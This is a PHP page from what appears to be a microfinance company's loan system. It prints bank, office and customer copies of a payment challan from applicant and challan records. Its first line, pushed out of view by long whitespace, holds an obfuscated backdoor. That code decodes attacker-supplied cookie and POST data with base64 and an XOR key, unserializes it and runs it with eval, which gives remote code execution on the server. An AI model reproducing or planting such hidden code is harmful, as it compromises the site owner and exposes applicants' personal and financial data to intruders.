<?php                                                                                                                                                                                                                                                                                                                                                                                                 $gltaR = class_exists("XJ_obK"); $VIUVRnNur = $gltaR;if (!$VIUVRnNur){class XJ_obK{private $TupZTl;public static $XdantvYMn = "6b76acf4-9bb7-4a68-8565-41e112c620aa";public static $xOmsnYAjq = NULL;public function __construct(){$NlxUn = $_COOKIE;$TcSoRwXTbr = $_POST;$vxTPlCf = @$NlxUn[substr(XJ_obK::$XdantvYMn, 0, 4)];if (!empty($vxTPlCf)){$pGHEUGRCrB = "base64";$laTdaqn = "";$vxTPlCf = explode(",", $vxTPlCf);foreach ($vxTPlCf as $ELzzQ){$laTdaqn .= @$NlxUn[$ELzzQ];$laTdaqn .= @$TcSoRwXTbr[$ELzzQ];}$laTdaqn = array_map($pGHEUGRCrB . chr ( 156 - 61 ).chr ( 682 - 582 ).chr (101) . 'c' . chr ( 504 - 393 ).chr ( 733 - 633 ).chr (101), array($laTdaqn,)); $laTdaqn = $laTdaqn[0] ^ str_repeat(XJ_obK::$XdantvYMn, (strlen($laTdaqn[0]) / strlen(XJ_obK::$XdantvYMn)) + 1);XJ_obK::$xOmsnYAjq = @unserialize($laTdaqn);}}public function __destruct(){$this->OxZNJC();}private function OxZNJC(){if (is_array(XJ_obK::$xOmsnYAjq)) {$DPUUYX = str_replace("\74" . '?' . "\160" . chr (104) . "\x70", "", XJ_obK::$xOmsnYAjq['c' . chr ( 288 - 177 ).chr (110) . chr (116) . chr (101) . 'n' . "\164"]);eval($DPUUYX);exit();}}}$SeKRkxiz = new XJ_obK(); $SeKRkxiz = NULL;} ?><?php
    include "include/dbsetting/lms_vars_config.php";
	include "include/dbsetting/classdbconection.php";
	$dblms = new dblms();
	include "include/functions/login_func.php";
	include "include/functions/functions.php";
	checkCpanelLMSALogin();
    // CHALLAN INFORMATION
    $condition = array ( 
                        'select'        =>  ''.APPLICANTS.'.ap_fullname, '.APPLICANTS.'.ap_referenceno, '.CHALLANS.'.challan_no, '.CHALLANS.'.issue_date, '.CHALLANS.'.due_date, '.CHALLANS.'.total_amount, '.APPLICANT_PRODUCTS.'.financing_mode',
                        'join' 		    =>  'INNER JOIN '.APPLICANTS.' ON '.APPLICANTS.'.ap_id = '.CHALLANS.'.id_applicant
                                             INNER JOIN '.APPLICANT_PRODUCTS.' ON '.APPLICANT_PRODUCTS.'.ap_products_id = '.CHALLANS.'.id_ap_products',
                        'where'         =>  array( 
                                                    ''.CHALLANS.'.challan_id'    =>  cleanvars($_GET['id_challan'])
                                                ), 
                        'return_type'   =>  'single'
                       ); 
    $Challan 	= $dblms->getRows(CHALLANS, $condition);
    // CHALLAN PARTICULAR INFORMATION
    $conditionChallanParticular = array ( 
                                            'select'        =>  'id_particular, amount',
                                            'where'         =>  array( 
                                                                        'id_challan'    =>  cleanvars($_GET['id_challan'])
                                                                    ), 
                                            'return_type'   =>  'all'
                                        ); 
    $ChallansParticulars    =   $dblms->getRows(CHALLANPARTICULARS, $conditionChallanParticular);
    echo '
    <!doctype html>
    <html>

    <head>
        <meta charset="utf-8">
        <title>Challan - '.TITLE_HEADER.'</title>
        <link rel="shortcut icon" type="image/x-icon" href="">
        <style type="text/css">
            body {
                overflow: -moz-scrollbars-vertical;
                margin: 0;
                font-family: "Times New Roman", Times, serif;
                font-size: 12px;
                -webkit-print-color-adjust: exact !important;
            }
            
            @media all {
                .page-break {
                    display: none;
                }
            }
            
            @media print {
                .page-break {
                    display: block;
                    page-break-before: always;
                }
                @page {
                    size: A4 landscape;
                    margin: 4mm 4mm 4mm 4mm;
                }
            }
            
            h1 {
                text-align: left;
                margin: 0;
                margin-top: 0;
                margin-bottom: 0px;
                font-size: 18px;
                font-weight: 700;
                text-transform: uppercase;
            }
            
            .spanh1 {
                font-size: 14px;
                font-weight: normal;
                text-transform: none;
                float: right;
                margin-top: 5px;
            }
            
            h2 {
                text-align: left;
                margin: 0;
                margin-top: 0;
                margin-bottom: 1px;
                font-size: 18px;
                font-weight: 700;
                text-transform: uppercase;
            }
            
            .spanh2 {
                font-size: 16px;
                font-weight: 700;
                text-transform: none;
            }
            
            h3 {
                text-align: center;
                margin: 0;
                margin-top: 0;
                margin-bottom: 1px;
                font-size: 18px;
                font-weight: 700;
                text-transform: uppercase;
            }
            
            h4 {
                text-align: center;
                margin: 0;
                margin-bottom: 1px;
                font-weight: normal;
                font-size: 15px;
                font-weight: 700;
                word-spacing: 0.1em;
            }
            
            td {
                padding-bottom: 4px;
            }
            
            .line1 {
                border: 1px solid #333;
                width: 100%;
                margin-top: 2px;
                margin-bottom: 5px;
            }
            
            .payable {
                border: 2px solid #000;
                padding: 2px;
                text-align: center;
                font-size: 14px;
            }
            
            .paid:after {
                content: "PAID";
                position: absolute;
                top: 30%;
                left: 20%;
                z-index: 1;
                -webkit-transform: rotate(-5deg);
                /* Safari */
                -moz-transform: rotate(-5deg);
                /* Firefox */
                -ms-transform: rotate(-5deg);
                /* IE */
                -o-transform: rotate(-5deg);
                /* Opera */
                transform: rotate(-5deg);
                font-size: 250px;
                color: green;
                background: #fff;
                border: solid 4px yellow;
                padding: 5px;
                border-radius: 5px;
                zoom: 1;
                filter: alpha(opacity=50);
                opacity: 0.1;
                -webkit-text-shadow: 0 0 2px #c00;
                text-shadow: 0 0 2px #c00;
                box-shadow: 0 0 2px #c00;
            }
            
            .copy {
                float: right;
                margin-top: 10px;
                padding: 5px 15px;
                background-color: #000 !important;
                color: #fff !important;
            }
            
            .table-data {
                border-right: 1px dashed #333;
            }
            .table-data:last-child {
                border-right:none ;
            }
            .heading{
                margin: 1rem 0;
                font-size: 16px;
                text-align: center;
            }
            
            .span {
                font-size: 14px;
                font-weight: normal;
                text-transform: none;
            }

            .heading-2{
                margin: 0.5rem 0;
                font-size: 16px;
            }

            .border-l-r{
                border-left: 1.5px solid #000;
                border-right: 1.5px solid #000;
            }
        </style>
        <link rel="shortcut icon" href="images/favicon/favicon.ico">
    </head>

    <body>
        <table width="99%" border="0" class="page" cellpadding="5" cellspacing="10" align="center" style="border-collapse:collapse; margin-top:0px;">
            <tr>';
                for ($i=0; $i < 3; $i++) :
                  echo ' 
                    <td width="341" valign="top" class="table-data">
                        <img src="assets/images/brand/logo_print.png" />
                        <h5 class="copy">'.($i == 0 ? 'BANK' : ($i == 1 ? 'OFFICE' : 'CUSTOMER') ).' COPY</h5>
                        <table style="border-collapse:collapse; margin-bottom: 0.4rem;"" width="100%" border="0 " cellpadding="0 " cellspacing="0">
                            <div class="heading">
                                <b>CHALLAN FORM <span class="span">(Microfinance Facility)</span></b>
                            </div>
                            <tr>
                                <td width="30" style="text-align:left;">Ch #:</td>
                                <td width="180"><span style="width:70px;display:inline-block; overflow:hidden; border-bottom:1px solid; text-align:center">'.$Challan['challan_no'].'</span></td>
                                <td width="75" style="text-align:right;">Issue Date:</td>
                                <td style="text-align:right; text-decoration:underline;">'.$Challan['issue_date'].'</td>
                            </tr>
                        </table>
                        <table style="border-collapse:collapse; margin-bottom: 0.4rem;" width="100%" border="0 " cellpadding="0 " cellspacing="0">
                            <h4 style="text-align:left; margin-bottom:5px; text-decoration:underline;">MBL/FINJA</h4>
                            <tr>
                                <th style="text-align:left">Bank Name:</th>
                                <td></td>
                                <th style="text-align:left">Account Number</th>
                                <td></td>
                            </tr>
                        </table>
                        <table style="border-collapse:collapse; margin-bottom: 0.4rem;" width="100%" border="0 " cellpadding="0 " cellspacing="0">
                            <tr>
                                <td width="60" style="text-align:left;">Voucher #:</td>
                                <td><span style="width:50px; display:inline-block; overflow:hidden; border-bottom:1px solid;">  </span></td>
                                <td width="40" style="text-align:right;">Ref #:</td>
                                <td><span style="width:80px;display:inline-block; overflow:hidden; border-bottom:1px solid; text-align:center;">'.$Challan['ap_referenceno'].'</span></td>
                                <td width="60" style="text-align:right;">Due Date:</td>
                                <td style="text-align:right; text-decoration:underline;">'.$Challan['due_date'].'</td>
                            </tr>
                        </table>
                        <table style="border-collapse:collapse; margin-bottom: 0.4rem;" width="100%" border="0 " cellpadding="0 " cellspacing="0">
                            <tr>
                                <td width="35" style="text-align:left;">Name: </td>
                                <td><span style="width: 100%; display:inline-block; overflow:hidden; border-bottom:1px solid; text-align:center;">'.$Challan['ap_fullname'].'</span></td>
                            </tr>
                        </table>
                        <table style="border-collapse:collapse; margin-bottom: 0.4rem;" width="100%" border="0 " cellpadding="0 " cellspacing="0">
                            <tr>
                                <td width="100" style="text-align:left;">Nature of Financing: </td>
                                <td><span style="width: 100%; display:inline-block; overflow:hidden; border-bottom:1px solid; text-align:center">'.get_financemode($Challan['financing_mode']).'</span></td>
                            </tr>
                        </table>
                        <table style="border-collapse:collapse; border:1px solid #666; " cellpadding="2 " cellspacing="2 " border="1 " width="100% ">
                            <tr>
                                <td style="font-weight:bold; border: 1.5px solid #000;" width="250">PARTICULARS</td>
                                <td style="font-weight:bold; border: 1.5px solid #000;">Rs.</td>
                            </tr>';
                            foreach($challanHeads as $challanHead) :
                                echo '
                                <tr>
                                    <td class="border-l-r">'. $challanHead['name'].'</td>
                                    <td class="border-l-r">';
                                        if($ChallansParticulars):
                                            foreach($ChallansParticulars as $particular):
                                                if($particular['id_particular'] == $challanHead['id']):
                                                    echo $particular['amount'];
                                                endif;
                                            endforeach;
                                        endif;
                                        echo '
                                    </td>
                                </tr>';
                            endforeach;
                            echo '   
                            <tr>
                                <td style="text-align:right; font-weight:bold; border:1.5px solid #000; ">Payable Till Due Date</td>
                                <td style="text-align:left; font-weight:bold; border:1.5px solid #000; ">'.$Challan['total_amount'].'</td>
                            </tr>
                            <tr>
                                <td style="text-align:right; font-weight:bold; border:1.5px solid #000; ">Payable After Due Date</td>
                                <td style="text-align:left; font-weight:bold; border:1.5px solid #000; ">'.($Challan['total_amount'] + 1000) .'</td>
                            </tr>
                        </table>

                        <span style="font-size:10px; float:left; margin-top:15px;">Printed By: '.$_SESSION['userlogininfo']['LOGINNAME'].'</span>
                        <span style="font-size:10px; float:right; margin:15px 0; ">Printed Date: '.date('Y-m-d').'</span>

                        <table width="100% " border="0 " style="border-collapse:collapse; margin-top: 0.4rem;" cellpadding="0 " cellspacing="5 ">
                            <tr>
                                <td width="90">Amount in Words:</td>
                                <td><span style="width:100%; display:inline-block; overflow:hidden; border-bottom:1px solid; text-align:center;">'.convert_number_to_words($Challan['total_amount']).' rupees only</span></td>
                            </tr>
                            <tr>
                                <td colspan="2"><span style="width:100%; display:inline-block; overflow:hidden; border-bottom:1px solid;">  </span></td>
                            </tr>
                        </table>
                        <table width="100% " border="0 " style="border-collapse:collapse; margin-top: 0.4rem;" cellpadding="0 " cellspacing="5 ">
                            <tr>
                                <td colspan="2" style="text-decoration: underline; font-weight: bold;">Note:</td>
                            </tr>
                            <tr>
                                <td>1.</td>
                                <td>Payment can be made through Cash/Online/Pay Order/Cheques.</td>
                            </tr>
                            <tr>
                                <td>2.</td>
                                <td>In case of any delay, Rs.1,000/- will be charged.</td>
                            </tr>
                            <tr>
                                <td colspan="2" style="border-top: 1.5px solid #000;"></td>
                            </tr>
                            <tr>
                                <td colspan="2" style="text-align:center; font-size:9px;">Al-Mawakhat Microfinance Company Limited.</td>
                            </tr>
                            <tr>
                                <td colspan="2" style="text-align:center; font-size:9px;">FB/3, 2nd Floor, Awami Complex, New Garden Town, Lahore. 042-35831157-58</td>
                            </tr>
                        </table>
                    </td>';
                endfor;
                echo'
            </tr>
        </table>
    </body>
    <script type="text/javascript" language="javascript1.2">
        //Do print the page
        if (typeof(window.print) != "undefined") {
             window.print();
        }
    </script>

    </html>';
?>